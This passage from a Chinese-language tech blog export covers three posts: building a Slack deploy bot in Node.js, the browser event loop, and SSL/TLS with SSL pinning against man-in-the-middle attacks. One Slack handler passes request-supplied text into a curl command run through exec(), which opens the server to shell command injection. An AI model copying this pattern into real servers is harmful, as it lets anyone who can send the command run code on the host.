最新版本之後，完成此次更新 通知公司同仁，更新已結束 (用 Incoming Webhooks 通知) 這流程就會是我們所想要的，當然中間還可以透過 jenkins 去部署其他台伺服器用 slack 部署 server，超方便 der (但感覺拿來訂便當更好用 XD Slash Command介紹Slash Command 就是在 Slack 的聊天室下指令，例如1/deploy server就會觸發到遠端伺服器，伺服器解析 command 後，再去近一步做一些行為 建立新指令下圖就是設定 Slash Command 的地方我們設定了 command 為 /test，然後會用 POST 觸發到遠端的 https://your.website.com/test 比較重要的地方是，Request URL 一定要是 HTTPS，如果不是 HTTPS 一律拒絕，在 Slack 官方文件上面有以下這段說明 NOTE: If your Slack app is set to be distributable or is part of the Slack app directory, the URL you provide must be use HTTPS with a valid, verifiable SSL certificate. Self-signed certificates cannot be used. See below for more information. 按下 Save 之後，回到頁面會看到，就代表建立完成了 安裝進到你的 team按下 Install App to Workspace，就會到授權頁面，然後點下 Authorize 即可安裝完成 安裝後在 channel 會出現訊息，通知說已經把 App 加入進來了 這時候在聊天室裡面打下 /test 會出現我剛剛建立的 command 和 Description不過輸入之後，並不會有任何反應，原因是因為我們還沒有設置好伺服器端的設定 開始寫程式去接受 slash command這邊用 nodejs 示範建立一個簡單的伺服器去接受 slash command SSL 的建立容許我這邊就不做示範了 XD (有點麻煩 123456789101112131415161718const express = require('express');const app = express();const bodyParser = require('body-parser');app.use(bodyParser.json());app.use(bodyParser.urlencoded({ extended: false}));app.post('/test', (req, res, next) =&gt; { console.log(req.body); console.log(`User : ${req.body.user_name}`); console.log(`Text : ${req.body.text}`); console.log(`Command : ${req.body.command}`); return res.json({ text: 'Command is successful' })})app.listen(8080) 在輸入視窗輸入以下指令後 1/test Hi I'm from slack 伺服器端會得到 完整的 JSON 格式如下1234567891011121314// 敏感資訊我都以 X 先馬掉了{ token: 'XXXXXXXXXXXXXXXXXXXXXXX', team_id: 'XXXXXXXXX', team_domain: 'XXXXXX', channel_id: 'XXXXXXXXX', channel_name: 'announcement', user_id: 'XXXXXXXXX', user_name: 'yujack', command: '/test', text: 'Hi I\\'m from slack', response_url: 'XXXXXXXXXXXXXX', trigger_id: 'XXXXXXXXXXXXXX' } 而在輸入窗那邊會看到 代表指令有成功到伺服器上面了，然後回傳一個 “Command is successful”指令完成後，一定會想問一個問題 『我想要通知其他人，我觸發了這個指令，我不想要只有我看到，那我該怎麼做？』 這時候就是下一個功能 Incoming Webhooks Incoming Webhooks介紹Incoming Webhook，可以直接讓你用 curl 的方式去發訊息到某一個 chaneel 裡面 啟用啟用 Incoming Webhooks 功能 啟用之後，會在下面看到一個範例，還有新增 Webhook 的地方 點選 “Add New Webhook to Workspace”，會到授權頁面這裡會出現，你想要把訊息可以傳送到哪一個地方那這裡我就選擇 general 作為範例 使用在 terminal 貼上以下指令 1curl -X POST -H 'Content-type: application/json' --data '{\"text\":\"Hello, World!\"}' https://hooks.slack.com/services/XXXXXXXX 在你設定要傳送的那個 channel 就會出現訊息了 那有了這個 Webhooks 之後，剛剛的 nodejs server 就可以稍微做更改這樣的話就可以告訴那一個 channel 的人說，你執行了什麼樣的指令 ~ 12345678910111213141516171819202122232425262728293031const express = require('express');const app = express();const bodyParser = require('body-parser');app.use(bodyParser.json());app.use(bodyParser.urlencoded({ extended: false}));app.post('/test', (req, res, next) =&gt; { console.log(req.body); console.log(`User : ${req.body.user_name}`); console.log(`Text : ${req.body.text}`); console.log(`Command : ${req.body.command}`); const command = `curl -X POST ` + `-H 'Content-type: application/json' ` + `--data '${JSON.stringify(req.body.slack_message)}' ` + `https://hooks.slack.com/services/XXXXXXXXX`; exec(command, (error, stdout, stderr) =&gt; { if (error) { console.error(`exec error: ${error}`); return; } return res.json({ text: 'Command is successful' }) })})app.listen(8080) 到這裡不禁會想到一個問題，我能不能不把 branch 記起來我直接讓 server 告訴我，我在選一個我想要的去 deploy 呢? 這時候，Interactive Components 就派上用場了這個功能可以接收使用者選擇了什麼選項，然後進一步去分析接下來就要介紹 Interactive Components Interactive Components介紹這是一個互動式的功能，在 Slack 上面可能會跳出 Message Button : 例如是否同意這個意見? Menus : 例如訂 A 便當 or B 便當? Dialogs : 例如通知? 當使用者點選了某一個按鈕或是選擇了其中一個選項就會 post 到 server 上，跟 server 說使用者做了什麼選擇學會 Interactive Componet 之後，我們自動化流程就可以改成 在 Slack 上打 /show ticket (用 Slash Command 通知 server) Server 回傳 ticket server 所有的 branch (用 Incoming Webhooks 通知) 使用者點選其中一個 branch 進行 deploy (用 Interactive Components 接收使用者點選哪一個 branch) Server 就會接收到需要 deploy tickey server，然後切換到 master branch 上面 pull 最新版本之後，完成此次更新 通知公司同仁，更新已結束 (用 Incoming Webhooks 通知) 啟用 使用在使用 Interactive Componets 之前，要先學會如何製作選項或是按鈕給使用者點選Slack 官方有提供地方可以客製化不同的按鈕或是表單的地方，點這進去我客製化了這個訊息 123456789101112131415{ \"text\": \"Would you like to play a game?\", \"attachments\": [{ \"text\": \"Choose a game to play\", \"fallback\": \"You are unable to choose a game\", \"callback_id\": \"wopr_game\", \"attachment_type\": \"default\", \"actions\": [{ \"name\": \"game\", \"text\": \"Chess\", \"type\": \"button\", \"value\": \"chess\" }] }]} 拿到訊息之後，利用 Incoming Webhooks 送出到使用者端給使用者點選 點選之後伺服器會發 POST 到 https://your.website.com/interactive伺服器就會收到以下資訊 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// Before JSON.Parse{ payload: '{\"actions\":[{\"name\":\"game\",\"type\":\"button\",\"value\":\"chess\"}],\"callback_id\":\"wopr_game\",\"team\":{\"id\":\"XXXXXXXXX\",\"domain\":\"XXXXXX\"},\"channel\":{\"id\":\"XXXXXXXXX\",\"name\":\"general\"},\"user\":{\"id\":\"XXXXXXXXX\",\"name\":\"yujack\"},\"action_ts\":\"1507970582.644321\",\"message_ts\":\"1507970575.000002\",\"attachment_id\":\"1\",\"token\":\"XXXXXXXXXXXXXXXXXXXXXXX\",\"is_app_unfurl\":false,\"type\":\"interactive_message\",\"original_message\":{\"text\":\"Would you like to play a game?\",\"bot_id\":\"XXXXXXXXX\",\"attachments\":[{\"callback_id\":\"wopr_game\",\"fallback\":\"You are unable to choose a game\",\"text\":\"Choose a game to play\",\"id\":1,\"actions\":[{\"id\":\"1\",\"name\":\"game\",\"text\":\"Chess\",\"type\":\"button\",\"value\":\"chess\",\"style\":\"\"}]}],\"type\":\"message\",\"subtype\":\"bot_message\",\"ts\":\"1507970575.000002\"},\"response_url\":\"https:\\\\/\\\\/hooks.slack.com\\\\/actions\\\\/XXXXXXXXX\\\\/XXXXXXXXX\\\\/XXXXXXXXXXXXXXXXXXXXXXXXX\",\"trigger_id\":\"XXXXXXXXX.XXXXXXXXX.XXXXXXXXXXXXXXXXXX\"}'}// After JSON.parse{ payload: { actions: [{ name: 'game', type: 'button', value: 'chess' }], callback_id: 'wopr_game', team: { id: 'XXXXXXXXX', domain: 'XXXXXX' }, channel: { id: 'XXXXXXXXX', name: 'general' }, user: { id: 'XXXXXXXXX', name: 'yujack' }, action_ts: '1507970582.644321', message_ts: '1507970575.000002', attachment_id: '1', token: 'XXXXXXXXXXXXXXXXXXXXXXX', is_app_unfurl: false, type: 'interactive_message', original_message: { text: 'Would you like to play a game?', bot_id: 'XXXXXXXXX', attachments: [ [Object] ], type: 'message', subtype: 'bot_message', ts: '1507970575.000002' }, response_url: 'https://hooks.slack.com/actions/XXXXXXXXX/XXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXXXX', trigger_id: 'XXXXXXXXX.XXXXXXXXX.XXXXXXXXXXXXXXXXXX' }} 按鈕會消失，然後顯示你在 server 上面回傳的完成資訊收到資訊之後，就可以知道使用者點選了什麼按鈕或是選擇了什麼選項根據這些選項伺服器在做一些處理就可以完成了 伺服器上面的程式會長這樣 (這邊單純印出來而已，沒有做後續處理 123456app.post('/interactive', (req, res, next) =&gt; { console.log(req.body); return res.json({ text: 'Command is successful' })}) 結論我用了一個情境讓大家比較好思考如何把這三個功能串起來雖然我還是覺得用在訂便當上面很方便就是了 (? 不過有些細部關於真正如何部署或是 SSL 的部分這裡就不會說明了那個會需要花到一兩篇文章的篇幅去介紹 如果有任何問題，請歡迎一起來討論 ~","link":"/2017/10/14/Slack-Bot/"},{"title":"Event Loop 運行機制解析 - 瀏覽器篇","text":"前言網路上有許多文章在討論瀏覽器內 event loop 的機制不少文章都有探討到所謂宏任務 (macrotask or task) 以及微任務 (microtask) 東西但我開始好奇這東西在瀏覽器內的規範是如何去寫這些東西以及定義這些名詞又或是名詞是不是真的跟網路文章說的一樣於是開始想深入了解，究竟在瀏覽器規範中，是怎麼是對 event loop 去說明的 如果要開始看規範的話，原本是想針對 ECMA 內的 JS 機制去閱讀但深入一看才發現，ECMA 內根本沒有針對 JS event loop 的機制去做說明經過一段時間查找後，才發現真正定義 event loop 執行順序以及方法的細節是被歸類在 HTML Living Standard 裡面 HTML Living Standard 基本上就是規範了瀏覽器內核心該如何實現的一套規則官網在此，在此規範裡面就有提到 event loop 的機制 Processing Model在 8.1.4.3 Processing Model 完整定義一個 event loop 包含了哪東西這邊擷取原文的部分內容 先以簡單的方式說明重點步驟 1 ~ 6 重點在於執行 task queue 內的 oldest task 7 執行 mircrotask checkpoint 如果 microtask queue 不為空的話，則會執行 microtask queue 裡面的 microtask 10 執行 rendering 但接下來就要開始問，什麼是 task ? 什麼是 microtask ? 什麼是 rendering ? tasktask 擁有自己的 task queue，不同於待會提到的 microtask queue但要注意的雖然叫做 task queue 但這裡的資料結構並不是 queue 而是 sets task 主要包含以下職責 The user interaction 主要是 event callback，像是滑鼠事件的 callback 是屬於此 task 的範疇 The DOM manipulation DOM Manipulation 像是 document.body.style = 'background:yellow'; 也是屬於此 task The networking 這就像 ajax 觸發時的 callback The history traversal 官網上面是提到 history.back() 這是屬於 task 這種類型 可參考 HTML Living Standard - Generic task sources在這份規範中，沒看到所謂的 macrotask可是會發現在掘金上面都會把此 task 稱為 macrotask 去解釋個人是覺得以規範裡面的名詞去說明比較適合，所以這邊都只會稱 task microtaskmicrotask 是會在每一輪 event loop 進行渲染之前會被觸發且只要在 microtask queue 裡面還有東西的話，就會一直執行下去直到整個 microtask queue 變成空的為止也就是說在 microtask 執行的時候，又觸發 queue 新的 microtask 的話這個新的 microtask 也是會在此輪 task 執行完之前執行，不會留到下一輪 task比較著名的 microtask 就是 Promise 以及 MutationObserver且此 microtask 擁有自己的 microtask queue，這裡的 queue 就是真的 queue 了詳細可以在讀讀以下這張圖 可參考 HTML Living Standard - microtask-queue renderingrendering 就是渲染透過 parse HTML 變成 DOM Tree 以及 parse CSS 變成 CSSOM Tree並且把 DOM Tree 跟 CSSOM 進行合成變成最後的 Render Tree並根據這個 Render Tree 去計算節點的位置去對整個畫面進行 Paint (繪製)這整個過程就是 rendering另外在修改 DOM 的狀況下，也會出現 Reflow (重排/回流) 或是 Repaint (重繪) 的現象整個概念流程如圖下，詳細可以參考 Render-tree Construction, Layout, and Paint 另外在規範上面有提到每一輪的 event loop task 結束後不一定會需要 rendering原因是為了要達到每秒 60 fps 的效果 (60 frams per second)每次瀏覽器繪出一個 frame 的間隔時間為 16.7 ms如果在 16.7ms 內進行兩次 DOM 操作的話，是有可能不會出現兩次渲染的另一個發生的原因是在畫面上如果沒有可見的影響的渲染的話，這次就是不必要的渲染 Event Loop 流程圖根據上面對 task 以及 microtask 的介紹以及 event loop 流程，可以簡化成以下這張流程圖 但這邊要注意的是，真正執行渲染時的 thread 跟執行 js 的 thread 是屬於不同個 thread執行 js 程式的 thread 範疇是在 task 以及 microtask 中但進行渲染時會是透過另一個 GUI thread 去進行渲染 這裡先幫忙補充名詞以及知識process 又名進程、處理程序，thread 又名線程、執行緒程式在執行時被稱為 process有時候我們寫的程式想要開另一條分支去幫忙做計算，那條分支被稱為 thread而 process 是由一個或是多個 thread 組合而成的每個 process 是不會共享記憶體空間的，但是在 process 底下的 threads 們是可以互相共享的而 process 之間可以透過 Inter Process Communication (IPC) 去做溝通，這邊就不針對這個做說明 此兩個 thread 是屬於互斥關係可以試試以下代碼證明，GUI Thread 和 JS Thread 是互斥的當還在執行 js 時，你是看不到他把畫面變成紅色的最終你只會看到畫面變成藍色的可以查看 js 引擎与 GUI 引擎是互斥的看看更多互斥的範例12345678910111213&lt;html lang=\"en\"&gt;&lt;body&gt; &lt;script&gt; function sleep(second) { var start = +new Date(); while (start + second * 1000 &gt; (+new Date())) {} } document.body.style.backgroundColor = \"red\"; sleep(5) document.body.style.backgroundColor = \"blue\"; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 談談瀏覽器 process/thread 關係看到這裡大家可能會覺得網頁開啟來就是只會有一個進程然後包含 GUI Thread, JS Thread 等等但其實並不都是這樣，有的瀏覽器實作方式是透過 multi-process 的方式去實作例如說 Chrome 的做法就是下圖右方的方法去實作 圖片出處 Inside look at modern web browser (part 1)圖中黑色外框表示 process裡面有一個虛線很像魚的是 thread (Google 說像魚的，不是說我的 XD)從圖裡面也可以看到，除了包含 Render 之外，還有 Network, GPU, Device 各式各樣的 thread/process (根據瀏覽器實作機制，可能是 thread 可能是 process)以 Chrome 來說, GUI 和 JS 相關的任務，都被歸類在 Render Process 裡面所以在 Chrome 的 Render Process 裡面的 GUI 和 JS 都是 thread 的概念 以 multi-process 去設計瀏覽器的時候當你擁有三個 tab 就會擁有三個 render process 去控制當發生其中一個 tab 壞掉的時候，是不會去影響另外兩個 process但如果當你只有一個 process，另外 3 個 tab 都是這個 process 裡面 thread 的話萬一 process 壞掉，這樣 3 個 tab 是會都會掛掉的 (因為 process 掛了, thread 也不用想活了) 圖片出處 Inside look at modern web browser (part 1)題外話，非常推薦大家去看 Inside look at modern web browser (part 1) 這系列 1-4 的文章圖文並茂，針對瀏覽器的機制講得很清楚 執行範例介紹以上名詞以及流程後，我們來試試看以下幾個例子 範例一以下屬於主程式碼，也就是被放在 task 裡面去執行，最後才會進行渲染以下面的例子來說，畫面最終會被渲染成紅色，但不會是 黃 藍 紅的順序下去因為整段是屬於第一輪的 task，最後渲染是會吃最後一個紅色的屬性 123document.body.style = 'background:yellow';document.body.style = 'background:blue';document.body.style = 'background:red'; 範例二這邊有 setTimout，代表裡面的 callback 會被放在下一輪的 task 之中這樣第一輪的 task 執行渲染藍色，第二輪的 task 執行渲染黑色所以畫面上會先看到藍色再看到黑色1234document.body.style = 'background:blue';setTimeout(function test(){ document.body.style = 'background:black'}, 0) 中間有一段有用慢動作播放，以方便看渲染效果但注意，如果瀏覽器是以 60 fps 進行的話, 代表說這個 setTimeout 時間沒有大於間隔 16.7 ms在這個狀況是有可能發生只有一次渲染的結果，也就是只看到黑色並沒有藍色如果要一定要讓瀏覽器出現兩次渲染，可以把 setTimeout 改成 16.7後面的範例也是如此 為了驗證是分別在兩輪 event loop 後執行 rendering 這件事我們來試試看使用 chrome performance 檢測看看首先先把程式改成利用 click 觸發，這樣比較好追蹤事件12345678910111213&lt;html lang=\"en\"&gt; &lt;button id=\"button\"&gt;button&lt;/button&gt; &lt;body&gt; &lt;script&gt; document.getElementById(\"button\").addEventListener(\"click\", function test() { document.body.style = 'background:blue'; setTimeout(function test2(){ document.body.style = 'background:black' }, 0) }) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 從第一張可以知道有兩個綠色的地方，都是 paint 的行為 這邊 Chrome 版本 80.0.3987.66 上面有一個 task 的標籤我查不太到這個代表的意思但依照規範上面 event loop 的概念那個灰色的 task 標籤，就是代表每一次的 event loop推測的一個原因是在後面的 microtask 範例中，執行 microtask 被歸類在這個灰色 task 標籤下面如有錯誤請糾正，感謝！！ 先放大最左邊黃色部份來看看 (大約 2440 ms)，會發現 task 尾端執行了一個叫做 test 的 function還有一個 setTimeout 的 function (被稱為 test2)然後接下來下一個 task 就開始有第一個 paint (blue) 再放大中間右邊的黃色部份 (大約 2442 ms)，會發現 task 尾端執行了一個叫做 test2 的 function這個 test2 就是前面 setTimeout 設定好的 function觸發執行後，接下來就會觸發第二個 paint (black) 開始執行 paint 的動作把畫面渲染成黑色 (大約 2449 ms) 小整理 大約 2440 ms 的時候，執行了第一輪 task 並觸發了第一個 paint (blue) 以及 setTimeout 大約 2442 ms 的時候，觸發了 setTimeout 的行為 大約 2449 觸發了第二個 paint (black) 此 paint 的行為是來自 setTimeout 裡面的程式碼 可以在圖片上面有一個 frames 可以判斷，總共對畫面進行兩次更新 至於要怎麼看 Paint 的畫面可以按照以下步驟去證明 範例三這邊有 Promise，代表裡面的 callback 會被放在此輪的 microtask 之中第一行是指定在渲染的時候要渲染藍色，但按照流程圖來說最後要執行渲染之前還會先跑 microtask 的 callback跑完 microtask 的 callback 後，指定在渲染時要是黑色第一輪結束後，只會執行渲染黑色，所以畫面上只會看到黑色而 log 的順序會是 1, 3, 2 1234567document.body.style = 'background:blue'console.log(1);Promise.resolve().then(()=&gt;{ console.log(2); document.body.style = 'background:black'});console.log(3); 我們再來看看 chrome 的 performance 的結果如何為了方便檢測，把 js 那一段程式把也改成\b由 click 進行觸發12345678910111213141516&lt;html lang=\"en\"&gt; &lt;button id=\"button\"&gt;button&lt;/button&gt; &lt;body&gt; &lt;script&gt; document.getElementById(\"button\").addEventListener(\"click\", function test() { document.body.style = 'background:blue' console.log(1); Promise.resolve().then(function test2(){ console.log(2); document.body.style = 'background:black' }); console.log(3); }) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 按照 Promise 是走 microtask 的概念，所以不會進入新的一輪 task 裡面在一次 event loop 結束後，這段程式把只會觸發一次 paint 的效果最下面可以看到觸發 test function 後，又觸發了 microtask然後就結束這一輪的 task，接下來才是 paint 範例四先來看渲染顏色的順序效果第一輪的 task 之中，第一行指定了藍色但在跑完 Promise 的 microtask 後，會變成黃色所以在第一輪結束之時，會直接把畫面渲染成黃色但因為我們有設定在 setTimout 也會執行渲染所以會變成第一輪 task 結束後是黃色，但在第二輪 task 結束後，會變成紅色至於 log 順序的話為 1, 3, 2, 4, 5 1234567891011121314document.body.style = 'background:blue'console.log(1);setTimeout(() =&gt; { console.log(5) document.body.style = 'background:red'}, 0)Promise.resolve().then(()=&gt;{ console.log(2); document.body.style = 'background:black'}).then(() =&gt; { console.log(4); document.body.style = 'background:yellow'});console.log(3); 中間有一段有用慢動作播放，以方便看渲染效果 我們再來看看 chrome 的 performance 的結果如何為了方便檢測，把 js 那一段程式把也改成\b由 click 進行觸發1234567891011121314151617181920212223&lt;html lang=\"en\"&gt; &lt;button id=\"button\"&gt;button&lt;/button&gt; &lt;body&gt; &lt;script&gt; document.getElementById(\"button\").addEventListener(\"click\", function test() { document.body.style = 'background:blue' console.log(1); setTimeout(function test2(){ console.log(5) document.body.style = 'background:red' }, 0) Promise.resolve().then(function test3(){ console.log(2); document.body.style = 'background:black' }).then(function test4(){ console.log(4); document.body.style = 'background:yellow' }); console.log(3); }) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 可以看到上面有兩個 task 是主要進行 paint 的行為 放大左半邊來看看，會發現左半邊執行了一個叫做 test function也就是我們程式碼裡面的 click callback functioncallback function 裡面有一個 setTimeout function所以在 task 結束的尾端可以發現有一個 setTimeout 事件\b被觸發但這個 setTimeout 的 test2 function 是在下下一輪 task 才會進行動作 (畫面右邊的 test2)而在中間的 task 就進行 paint 的動作 (變成黃色) 而把背景變成紅色則是在更後面的 task 範例五此範例是來自於 Tasks, microtasks, queues and schedules以下是裡面的 demo 範例，可以清楚看到每種 callback 放在 task 又或是 microtask 裡面 後記這次介紹的是瀏覽器版本的 event loop，但其實 node.js 的 event loop 又不一樣這個之後再介紹 node.js 版本的 event loop 又是如何運作的另外這邊文章也有簡單談到渲染引擎，這裡面還有牽扯到關於 Reflow 以及 Repaint 的行為這個也會另外在開新的文章做詳細解釋還有本文提到有些名詞有結合中國的一些技術名詞，這樣大家在看中國的技術文章時會比較好同步 References 「前端进阶」从多线程到Event Loop全面梳理 針對瀏覽器的 event loop 的介紹渲染例子非常的詳細，非常推薦看看 Tasks, microtasks, queues and schedules 針對 task, microtask 都有詳細的說明，也有針對不同瀏覽器做比對 js引擎与GUI引擎是互斥的 深入探究 eventloop 与浏览器渲染的时序问题 从event loop规范探究javaScript异步及浏览器更新渲染时机 Render-tree Construction, Layout, and Paint Inside look at modern web browser (part 1) Inside look at modern web browser (part 2) Inside look at modern web browser (part 3) Inside look at modern web browser (part 4)","link":"/2020/02/03/javascript-runtime-event-loop-browser/"},{"title":"從 SSL 到 SSL Pinning 看完你就懂！","text":"前言看不懂跟我說，我想辦法補充 XD 正文開始 …某天有人問我 某: SSL Pinning 是什麼東西啊?我: SSL Pinning 是為了抵禦中間人攻擊而形成的一種防禦機制某: …… 你這樣說最好是有人聽得懂我: 我錯了 … 給點機會讓我重新解釋解釋 為了要了解這個的意思我們要先來說說 SSL 是什麼而 SSL Pinning 又是要 pin 什麼東西然後中間人又是哪個小三?? 什麼是 SSL?SSL 全名是，Secure Sockets Layer但這是屬於舊的標準，新的標準則是 Transport Layer Security (TLS) 但不管新舊標準，他們的目的都是同一個那就是保護使用者資料的安全為目的，但 … 怎樣算保護呢? 這裡提到安全其實又會切分成三個種類可用性、機密性、完整性，這個有機會再開個篇章來談談這邊就先當成是保護資料安全吧！ 先來說一般的狀況，沒有 SSL 的時候A 跟 B 兩家房子，之間有一個傳輸通道是用來傳輸各種訊息或是物資，但！！！這個通道是透明的也就是說，其他人可以跟清楚的看到 A 跟 B 到底在秘密地交換什麼東西而有了 SSL 後，就是從原本的透明傳輸管道升級成非透明的傳輸管道這樣其他人就不容易的去看到 A 跟 B 在運送什麼東西了 這裡就不提到 http 和 https 的概念但可以簡單說，http 有了 ssl 就升級為 httpshttp 就是透明管道https 就是非透明管道 那麼 SSL 是怎麼運作的，我們首先要知道 公私鑰 的概念SSL 其中有一段是透過非對稱式加密的公私鑰達到認證並建立連線通道建立安全連線通道後，會利用對稱式加密對這之間所有資料進行加解密 聽起來很饒口 … 沒關係為了要了解整個概念我們必須先來談談對稱式加密和非對稱式加密 首先是對稱式加密假如有一種加密的演算法是『把字母往後位移 k 個位子，把位移後的結果以及 k 給對方』所以當 A 想要告訴 B 一件事情A 就透過這種加密方法把 HI 這個詞，往後位移 2 個位子，就變成 JK當 B 收到位移數是 2 以及 JK 的時候，B 就可以透過這個位移數 2 把他回推成 HI這裡的 2 就是我們的 k 也就是我們的金鑰，A 和 B 都是拿到同樣的數字 2這就是對稱式加密的一種概念 那非對稱式就是 A 和 B 拿到的金鑰是不同個的 (以上述例子，A 拿公鑰，B 拿私鑰)而公私鑰，一定是一組一對一配對起來的，如果公鑰是 O 私鑰是 P那絕對是 OP 為一組，不會有 WP 這種組合出現或是 OW 這種組合出現而如何實現這種演算法，請參考 RSA 相關的文章，這裡就不多做解釋 (不然就跑題了 所以在 SSL 的概念裡面會有公私鑰，這裡有兩個概念第一種：資料透過私鑰加密，再透過公鑰解密 -&gt; 驗證訊息來源是否真的是擁有私鑰的人第二種：資料透過公鑰加密，再透過私鑰解密 -&gt; 把資料加密，並可還原資料 在 SSL 整個通訊協議中，當瀏覽器收到伺服器 A 送來可支援的加密演算法時會看到利用第一種方式去驗證伺服器 A 傳送過來的資料是否真的是伺服器 A 而不是 B 的接下來會選擇一把對稱式加密金鑰，然後利用第二種方式加密傳給伺服器伺服器解密後取得這把對稱式加密金鑰，之後瀏覽器和伺服器之間的通訊就用這把對稱式金鑰加解密 整個 SSL 建立的步驟可以分為以下三個大項 Authentication (藍色部分): 使用非對稱式加密演算法進行伺服器數位簽章的認證 Key Exchange (綠色部分): 交換一把對稱式加密金鑰 Encrypted Data Transfer (紅色部分): 瀏覽器和伺服器利用第二步的對稱式加密金鑰，對通訊間的資料進行加解密 可以參考下面的簡略圖，但更詳細的就不是本篇探討的地方詳細可以參閱那些關於SSL/TLS的二三事(九) — SSL (HTTPS)Communication看更多細節 第二個步驟的交換，可以利用伺服器憑證的公鑰加密對稱式金鑰伺服器收到這個加密後的對稱式金鑰，就可以用私鑰解密，然後取得對稱式金鑰但如果是使用 Diffie — Hellman 去交換對稱式金鑰的話就不需要用公鑰加密，私鑰解密了因為 Diffie — Hellman 可以”安全地”告訴對方密碼而不用擔心密碼被竊聽. 剛剛提到的憑證，就是我們瀏覽器上面會看到鎖頭，點開後那就是憑證 執行此指令可以看到完整的憑證openssl s_client -connect github.com:443 -servername github.com -showcerts 因為這憑證很長一串，這裡就不截圖顯示了各位可以自行在電腦上面執行試試看 那為什麼透過憑證可以取得到公鑰呢? 因為從私鑰中是可以算出 public key 出來的產生憑證的流程是，一開始產生出來的公私鑰匙，透過私鑰產出一個憑證申請檔案這個憑證申請檔案會包含一些申請者的資訊以及公鑰此檔案經過第三方的認證之後，就會成了憑證所以透過憑證可以把公鑰取得回來 私鑰產生出來之後，是要被嚴格保管的，絕對不能洩漏出去，所以才會稱為私鑰但公鑰就沒關係了，所以才會叫做公開金鑰 (公鑰) 什麼是 SSL Pinning ?前面有提到一個概念，公私鑰是一對一配對的所以同一組公私鑰出來的憑證，這個憑證裡面的公鑰絕對是不會變的而 SSL Pinning 就是要把 SSL 固定起來這個固定就是利用公鑰的特性達到的 假設今天我有一個 App 是專門瀏覽 github.com 用的github.com 憑證內的公鑰是 O 的話而我 App 裡面的程式，已經有預先寫好 O 這個公鑰所以當我瀏覽 github.com 的時候，取得憑證內的公鑰 O拿這個公鑰 O 去跟程式裡面寫好的 O 比對是一樣的，就繼續連線不一樣的話就拒絕連線，因為不一樣的話，一定是有什麼狀況發生，不要連線比較好這就是 SSL Pinning，確保連線的網址憑證是安全的 而發生不一樣的狀況，通常是所謂的中間人攻擊 中間人攻擊在正常連線的狀況下，都是屬於下圖的狀況 (這邊以最單純只有 server 的架構來表示 中間人攻擊，就是中間卡了一個人幫你跟伺服器進行資料交換這樣就代表所有東西都會被這個中間人看光光 接下來可能會有一個疑惑，我都用 SSL 了，他怎麼會看到我傳送的封包?但其實當中間卡一個人的時候，你並不會知道中間真的有卡了一人在幫你交換資料以你連線到 github.com 的時候，如果你不特別去點憑證來看你其實並不會知道到底是怎麼一回事，讓我們看看下面 gif 的例子 左邊是我用無痕模擬被中間人攻擊的狀況，右邊則是我一般上網的狀況不點憑證之前，你其實很難分辨出來到底哪一種有問題這邊附上各個截圖，上圖為 gif 左邊，下圖為 gif 右邊 其實中間人的角色，其實就是充當伺服器再跟你進行 SSL 通道的建立所以對瀏覽器來說，這個中間人就是真正的伺服器，只是瀏覽器並不知情而已 但其實現實上瀏覽器其實不會那麼笨因為瀏覽器本身都會有一些本來就可以信任的 Root 憑證所以當瀏覽器遇到這種 Root 憑證怪怪的，基本上都是會拒絕連線的 這裡會可以連線是因為我先讓我的瀏覽器無條件相信這個中間人的 Root 憑證Root 憑證和一般我們所講的憑證有什麼不同，後面會介紹到 當不信任的狀況，瀏覽器就會出現以下的警告視窗裡面的英文訊息其實就很完整解釋，這個伺服器送回了異常的憑證，所以 Chrome 大大幫你擋掉不過如果你像我一樣設定好讓 Chrome 大大無條件相信的話，就不會出現這個警告視窗了 某: 我們已經知道 SSL 是什麼，也知道中間人攻擊是什麼了某: 但我們到底要如何做到 SSL Pinning 去預防這件事情呢某: 是只要取得 github.com 的憑證公鑰去驗證就好了嗎 我: 摁 … 且慢, 其實憑證還有所謂的憑證鍊, 就像上圖點開憑證會看到很像鏈子一整串的憑證我: 可以回去看上面那兩個 github.com 的圖裡面的憑證的顯示方法某: 等等！怎麼還有啊！也解釋太久了吧我: 幫我充值一下時間，快要結束了 憑證鍊從圖中可以看到憑證從上到下總計有三個 從上到下分別為 Root Certificate: DigitCert High Assurance EV ROOT CA Intermediate Certificate: DigitCert SHA2 Extended Validation Server CA Leaf Certificate: github.com \bLeaf 是被 Intermediate 簽署認證Intermediate 是被 Root 簽署認證 而 Root 憑證本身就會被安裝在手機以及瀏覽器以內但談到我剛剛有一個 github.com 被中間人攻擊的例子是我自行把中間人的 Root 憑證給安裝到電腦中，才會被攻擊實際上，其實有可能透過社交工程的方法，引誘使用者安裝這些不安全的 Root 憑證 以 Android 來說，可能會在 Settings &gt; Security &gt; Trusted Credentials 看到很多根憑證以 Mac 電腦來說，可以在 terminal 使用 open file:///System/Library/Security/Certificates.bundle/Contents/Resources/TrustStore.html打開後就會看到裝在這台電腦上面所有信任的 Root 憑證 那問題就來了，我要如果要做 SSL Pinning 要針對誰做 SSL Pinning 呢?答案其實是不用只選一個，也不一定要全部都選但基本上 Pinning Leaf 可以 100% 確認這一定是你的伺服器但如果當你的私鑰被洩漏出去，那個中間人也有辦法做出跟你一樣的公鑰出來的所以也會有人選擇不只 pinning Leaf，直接全部 pinning 也是一種方法 除了 Pinning 公鑰之外，也會有人選擇 Pinning 整個憑證的方式以 github.com 憑證來說有以下兩種顯示方式 公鑰: o5oa5F4LbZEfeZ0kXDgmaU2K3sIPYtbQpT3EQLJZquM= (sha256 + base64 後) 憑證檔: 1234567891011121314151617181920212223242526272829303132333435363738394041-----BEGIN 